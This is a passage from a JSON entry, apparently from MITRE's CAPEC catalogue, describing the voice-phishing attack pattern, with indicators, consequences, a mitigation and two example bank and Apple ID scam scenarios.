            "You receive any call that requests you provide sensitive information.",
            "You are redirected to a website that instructs you to call the number on-screen to address the call-to-action."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not accept calls from unknown numbers or from numbers that may be flagged as spam. Also, do not call numbers that appear on-screen after being unexpectedly redirected to potentially malicious websites. In either case, do not provide sensitive information over voice calls that are not legitimately initiated. Instead, call your Bank, PayPal, eBay, etc., via the number on their public-facing website and inquire about the problem."
        },
        "Example_Instances": {
          "Example": [
            "The target receives an email or text message stating that their Apple ID has been disabled due to suspicious activity and that the included link includes instructions on how to unlock their Apple account. The link in the text message looks legitimate and once the link is clicked, the user is redirected to a legitimate-looking webpage that prompts the user to call a specified number to initiate the unlock process. The target initiates the phone call and provides their credentials or other sensitive information to the individual they assume works for Apple. Now that the adversary possess this data, it can be used to log into the account to obtain other sensitive data, such as Apple Pay information.",
            "An adversary calls the target and claims to work for their bank. The adversary informs the target that their bank account has been frozen, due to potential fraudulent spending, and requires authentication in order to re-enable the account. The target, believing the caller is a legitimate bank employee, provides their bank account login credentials to confirm they are the authorized owner of the account. The adversary then confirms this authentication and claims that the account has been unlocked. Once the adversary has obtained these credentials, money can be transferred from the victim's account to an account controlled by the adversary."
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-592"
            },
            {
              "@External_Reference_ID": "REF-594"
            },
            {
              "@External_Reference_ID": "REF-595"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          }
        }
      }
    }
  }
]